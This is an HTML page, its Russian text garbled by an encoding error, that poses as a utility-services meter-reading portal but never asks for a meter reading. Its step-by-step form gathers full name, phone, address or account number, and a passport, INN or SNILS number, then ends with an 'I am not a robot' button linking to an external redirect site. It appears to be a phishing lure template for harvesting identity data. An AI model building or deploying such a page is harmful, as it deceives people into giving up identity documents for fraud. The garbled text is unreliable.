<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <title>–ñ–ö–• ‚Äî –ø–µ—Ä–µ–¥–∞—á–∞ –ø–æ–∫–∞–∑–∞–Ω–∏–π</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f8f9fa;
      padding: 20px;
      display: flex;
      justify-content: center;
      color: #333;
    }

    .container {
      max-width: 500px;
      width: 100%;
      margin: auto;
      background: #ffffff;
      padding: 25px;
      border-radius: 14px;
      box-shadow: 0 3px 12px rgba(0, 0, 0, 0.1);
    }

    .step {
      display: none;
    }

    .step.active {
      display: block;
    }

    h2, h3 {
      margin-bottom: 12px;
      font-weight: 700;
      font-size: 1.5em;
      display: flex;
      align-items: center;
      gap: 10px;
      color: #2c3e50;
    }

    input, select {
      width: 100%;
      padding: 14px;
      margin-top: 10px;
      border: 1px solid #dfe6e9;
      border-radius: 8px;
      font-size: 16px;
      box-sizing: border-box;
      background: #f9f9f9;
      color: #333;
    }

    input:focus, select:focus {
      outline: none;
      border-color: #3498db;
      background: #ffffff;
    }

    .buttons {
      margin-top: 18px;
      display: flex;
      gap: 12px;
      flex-wrap: wrap;
    }

    button {
      width: 100%;
      max-width: 100%;
      padding: 14px;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      font-size: 16px;
      font-weight: 600;
      text-align: center;
      box-sizing: border-box;
      transition: background 0.2s;
    }

    button:disabled {
      background: #dfe6e9;
      color: #7f8c8d;
      cursor: not-allowed;
    }

    .next {
      background: #3498db;
      color: #ffffff;
    }

    .next:hover:not(:disabled) {
      background: #2980b9;
    }

    .back {
      background: #b0b7c0;
      color: #ffffff;
    }

    .back:hover:not(:disabled) {
      background: #95a5a6;
    }

    .doc-btn {
      background: #1abc9c;
      color: #ffffff;
      flex: 1;
      text-align: center;
    }

    .doc-btn:hover:not(:disabled) {
      background: #16a085;
    }

    .support-btn {
      background: #2ecc71;
      color: #ffffff;
    }

    .support-btn:hover:not(:disabled) {
      background: #27ae60;
    }

    .faq-btn {
      background: #f1c40f;
      color: #333;
    }

    .faq-btn:hover:not(:disabled) {
      background: #f39c12;
    }

    .error {
      color: #e74c3c;
      font-size: 15px;
      margin-top: 6px;
      font-weight: 600;
    }

    small {
      color: #7f8c8d;
      display: block;
      margin-top: 6px;
      font-size: 14px;
    }

    a button {
      width: 100%;
    }
  </style>
</head>
<body>
  <div class="container">
    <form id="wizardForm">

      <!-- –í—Å—Ç—É–ø–ª–µ–Ω–∏–µ -->
      <div class="step active">
        <h2>üè† –ñ–ö–• ‚Äî –æ–Ω–ª–∞–π–Ω</h2>
        <p>üíß –ü–µ—Ä–µ–¥–∞–≤–∞–π—Ç–µ –ø–æ–∫–∞–∑–∞–Ω–∏—è –ø—Ä—è–º–æ –∏–∑ –±—Ä–∞—É–∑–µ—Ä–∞.</p>
        <p>‚ö° –í—Å–µ –¥–∞–Ω–Ω—ã–µ –ø—Ä–æ–≤–µ—Ä—è—é—Ç—Å—è –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏.</p>
        <p>üëã –ù–∞–∂–º–∏—Ç–µ ¬´–î–∞–ª–µ–µ¬ª, —á—Ç–æ–±—ã –Ω–∞—á–∞—Ç—å.</p>
        <div class="buttons">
          <button type="button" class="next">‚û°Ô∏è –î–∞–ª–µ–µ</button>
          <a href="https://support.example.com" target="_blank">
            <button type="button" class="support-btn">üìß –ü–æ–¥–¥–µ—Ä–∂–∫–∞</button>
          </a>
          <a href="https://faq.example.com" target="_blank">
            <button type="button" class="faq-btn">‚ùì –í–æ–ø—Ä–æ—Å—ã</button>
          </a>
        </div>
      </div>

      <!-- –§–ò–û -->
      <div class="step">
        <h3>üë§ –í–≤–µ–¥–∏—Ç–µ –§–ò–û</h3>
        <input type="text" id="fullname" placeholder="–ò–≤–∞–Ω–æ–≤ –ò–≤–∞–Ω –ò–≤–∞–Ω–æ–≤–∏—á" required>
        <div class="error" id="err-fullname"></div>
        <div class="buttons">
          <button type="button" class="back">‚¨ÖÔ∏è –ù–∞–∑–∞–¥</button>
          <button type="button" class="next">‚û°Ô∏è –î–∞–ª–µ–µ</button>
        </div>
      </div>

      <!-- –¢–µ–ª–µ—Ñ–æ–Ω -->
      <div class="step">
        <h3>üìû –ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞</h3>
        <input type="tel" id="phone" placeholder="+79991234567" required>
        <div class="error" id="err-phone"></div>
        <div class="buttons">
          <button type="button" class="back">‚¨ÖÔ∏è –ù–∞–∑–∞–¥</button>
          <button type="button" class="next">‚û°Ô∏è –î–∞–ª–µ–µ</button>
        </div>
      </div>

      <!-- –í—ã–±–æ—Ä —Ç–∏–ø–∞ –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏ -->
      <div class="step">
        <h3>üîç –í—ã–±–µ—Ä–∏—Ç–µ —Å–ø–æ—Å–æ–± –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏</h3>
        <select id="id-type" required>
          <option value="" disabled selected>–í—ã–±–µ—Ä–∏—Ç–µ —Ç–∏–ø</option>
          <option value="address">–ê–¥—Ä–µ—Å</option>
          <option value="account">–õ–∏—Ü–µ–≤–æ–π —Å—á—ë—Ç</option>
        </select>
        <div class="error" id="err-id-type"></div>
        <div class="buttons">
          <button type="button" class="back">‚¨ÖÔ∏è –ù–∞–∑–∞–¥</button>
          <button type="button" class="next">‚û°Ô∏è –î–∞–ª–µ–µ</button>
        </div>
      </div>

      <!-- –ê–¥—Ä–µ—Å -->
      <div class="step" id="step-address">
        <h3>üè† –ê–¥—Ä–µ—Å</h3>
        <input type="text" id="address" placeholder="–≥. –ú–æ—Å–∫–≤–∞, —É–ª. –õ–µ–Ω–∏–Ω–∞, –¥. 1" required>
        <div class="error" id="err-address"></div>
        <div class="buttons">
          <button type="button" class="back">‚¨ÖÔ∏è –ù–∞–∑–∞–¥</button>
          <button type="button" class="next">‚û°Ô∏è –î–∞–ª–µ–µ</button>
        </div>
      </div>

      <!-- –õ–∏—Ü–µ–≤–æ–π —Å—á—ë—Ç -->
      <div class="step" id="step-account">
        <h3>üí≥ –õ–∏—Ü–µ–≤–æ–π —Å—á—ë—Ç</h3>
        <input type="text" id="account" placeholder="1234567890" required>
        <div class="error" id="err-account"></div>
        <div class="buttons">
          <button type="button" class="back">‚¨ÖÔ∏è –ù–∞–∑–∞–¥</button>
          <button type="button" class="next">‚û°Ô∏è –î–∞–ª–µ–µ</button>
        </div>
      </div>

      <!-- –í—ã–±–æ—Ä –¥–æ–∫—É–º–µ–Ω—Ç–∞ -->
      <div class="step">
        <h3>üìÑ –í—ã–±–µ—Ä–∏—Ç–µ –¥–æ–∫—É–º–µ–Ω—Ç</h3>
        <div class="buttons">
          <button type="button" class="doc-btn" data-doc="passport">üìÑ –ü–∞—Å–ø–æ—Ä—Ç</button>
          <button type="button" class="doc-btn" data-doc="inn">üßæ –ò–ù–ù</button>
          <button type="button" class="doc-btn" data-doc="snils">üü¢ –°–ù–ò–õ–°</button>
        </div>
        <div class="buttons">
          <button type="button" class="back">‚¨ÖÔ∏è –ù–∞–∑–∞–¥</button>
        </div>
      </div>

      <!-- –ù–æ–º–µ—Ä –¥–æ–∫—É–º–µ–Ω—Ç–∞ -->
      <div class="step">
        <h3 id="doc-title">üî¢ –í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä –¥–æ–∫—É–º–µ–Ω—Ç–∞</h3>
        <div id="doc-example" style="margin-bottom:8px;color:#7f8c8d;font-size:15px;"></div>
        <input type="text" id="docnumber" required>
        <div class="error" id="err-doc"></div>
        <div class="buttons">
          <button type="button" class="back">‚¨ÖÔ∏è –ù–∞–∑–∞–¥</button>
          <button type="button" class="next">‚û°Ô∏è –î–∞–ª–µ–µ</button>
        </div>
      </div>

      <!-- –§–∏–Ω–∞–ª -->
      <div class="step">
        <h3>‚úÖ –í—Å—ë –≥–æ—Ç–æ–≤–æ!</h3>
        <p>–ü—Ä–æ–≤–µ—Ä—å—Ç–µ –¥–∞–Ω–Ω—ã–µ –∏ –∑–∞–≤–µ—Ä—à–∏—Ç–µ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ–º:</p>
        <a href="https://redirect.figma.site/" target="_blank">
          <button type="button" class="next">–Ø –Ω–µ —Ä–æ–±–æ—Ç ‚úÖ</button>
        </a>
        <div class="buttons">
          <button type="button" class="back">‚¨ÖÔ∏è –ù–∞–∑–∞–¥</button>
          <a href="https://support.example.com" target="_blank">
            <button type="button" class="support-btn">üìß –ü–æ–¥–¥–µ—Ä–∂–∫–∞</button>
          </a>
          <a href="https://faq.example.com" target="_blank">
            <button type="button" class="faq-btn">‚ùì –í–æ–ø—Ä–æ—Å—ã</button>
          </a>
        </div>
      </div>

    </form>
  </div>

  <script>
    const steps = document.querySelectorAll('.step');
    let currentStep = 0;
    let selectedDoc = null;
    let selectedIdType = null;

    function showStep(n) {
      steps.forEach((s, i) => s.classList.toggle('active', i === n));
      currentStep = n;
    }

    document.querySelectorAll('.next').forEach(btn => {
      btn.addEventListener('click', () => {
        if (!validateStep(currentStep)) return;
        let nextStep = currentStep + 1;

        // Skip address or account step based on user selection
        if (currentStep === 3) {
          selectedIdType = document.getElementById('id-type').value;
          if (selectedIdType === 'address') {
            nextStep = 4; // Show address step
          } else if (selectedIdType === 'account') {
            nextStep = 5; // Show account step
          }
        } else if (currentStep === 4 && selectedIdType === 'address') {
          nextStep = 6; // Skip account step
        } else if (currentStep === 5 && selectedIdType === 'account') {
          nextStep = 6; // Skip address step
        }

        if (nextStep < steps.length) showStep(nextStep);
      });
    });

    document.querySelectorAll('.back').forEach(btn => {
      btn.addEventListener('click', () => {
        let prevStep = currentStep - 1;

        // Adjust back navigation based on identification type
        if (currentStep === 6) {
          prevStep = selectedIdType === 'address' ? 4 : 5;
        } else if (currentStep === 5 && selectedIdType === 'account') {
          prevStep = 3;
        } else if (currentStep === 4 && selectedIdType === 'address') {
          prevStep = 3;
        }

        if (prevStep >= 0) showStep(prevStep);
      });
    });

    document.querySelectorAll('.doc-btn').forEach(btn => {
      btn.addEventListener('click', () => {
        selectedDoc = btn.dataset.doc;
        const docnumber = document.getElementById('docnumber');
        const example = document.getElementById('doc-example');

        if (selectedDoc === "passport") {
          docnumber.pattern = "^\\d{4}\\s?\\d{6}$";
          example.textContent = "–ü—Ä–∏–º–µ—Ä –ø–∞—Å–ø–æ—Ä—Ç–∞: 4510 123456 –∏–ª–∏ 4510123456";
        }

        if (selectedDoc === "inn") {
          docnumber.pattern = "^\\d{10}(\\d{2})?$";
          example.textContent = "–ü—Ä–∏–º–µ—Ä –ò–ù–ù: 500100732259";
        }

        if (selectedDoc === "snils") {
          docnumber.pattern = "^\\d{3}-?\\d{3}-?\\d{3}\\s?\\d{2}$";
          example.textContent = "–ü—Ä–∏–º–µ—Ä –°–ù–ò–õ–°: 112-233-445 95 –∏–ª–∏ 11223344595";
        }

        showStep(currentStep + 1);
      });
    });

    function validateStep(step) {
      let val, re;

      if (step === 1) {
        val = document.getElementById('fullname').value.trim();
        re = /^[–ê-–Ø–Å][–∞-—è—ë]+\s[–ê-–Ø–Å][–∞-—è—ë]+\s[–ê-–Ø–Å][–∞-—è—ë]+$/;
        if (!re.test(val)) {
          document.getElementById('err-fullname').textContent = "–í–≤–µ–¥–∏—Ç–µ –§–ò–û –ø–æ–ª–Ω–æ—Å—Ç—å—é –∫–∏—Ä–∏–ª–ª–∏—Ü–µ–π";
          return false;
        }
        document.getElementById('err-fullname').textContent = "";
        return true;
      }

      if (step === 2) {
        val = document.getElementById('phone').value.trim();
        re = /^(\+7|7)\d{10}$/;
        if (!re.test(val)) {
          document.getElementById('err-phone').textContent = "–¢–µ–ª–µ—Ñ–æ–Ω –≤ —Ñ–æ—Ä–º–∞—Ç–µ +79991234567";
          return false;
        }
        document.getElementById('err-phone').textContent = "";
        return true;
      }

      if (step === 3) {
        val = document.getElementById('id-type').value;
        if (!val) {
          document.getElementById('err-id-type').textContent = "–í—ã–±–µ—Ä–∏—Ç–µ —Å–ø–æ—Å–æ–± –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏";
          return false;
        }
        document.getElementById('err-id-type').textContent = "";
        return true;
      }

      if (step === 4 && selectedIdType === 'address') {
        val = document.getElementById('address').value.trim();
        if (val.length < 5) {
          document.getElementById('err-address').textContent = "–ê–¥—Ä–µ—Å —Å–ª–∏—à–∫–æ–º –∫–æ—Ä–æ—Ç–∫–∏–π";
          return false;
        }
        document.getElementById('err-address').textContent = "";
        return true;
      }

      if (step === 5 && selectedIdType === 'account') {
        val = document.getElementById('account').value.trim();
        re = /^\d{6,12}$/;
        if (!re.test(val)) {
          document.getElementById('err-account').textContent = "–°—á—ë—Ç 6-12 —Ü–∏—Ñ—Ä";
          return false;
        }
        document.getElementById('err-account').textContent = "";
        return true;
      }

      if (step === 7) {
        val = document.getElementById('docnumber').value.trim().replace(/[\s-]/g, '');
        let pattern;
        if (selectedDoc === 'passport') {
          pattern = "^\\d{4}\\d{6}$";
        } else if (selectedDoc === 'inn') {
          pattern = "^\\d{10}(\\d{2})?$";
        } else if (selectedDoc === 'snils') {
          pattern = "^\\d{9}\\d{2}$";
        }
        re = new RegExp(pattern);
        if (!re.test(val)) {
          document.getElementById('err-doc').textContent = "–ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç –Ω–æ–º–µ—Ä–∞";
          return false;
        }
        document.getElementById('err-doc').textContent = "";
        return true;
      }

      return true;
    }
  </script>
</body>
</html>
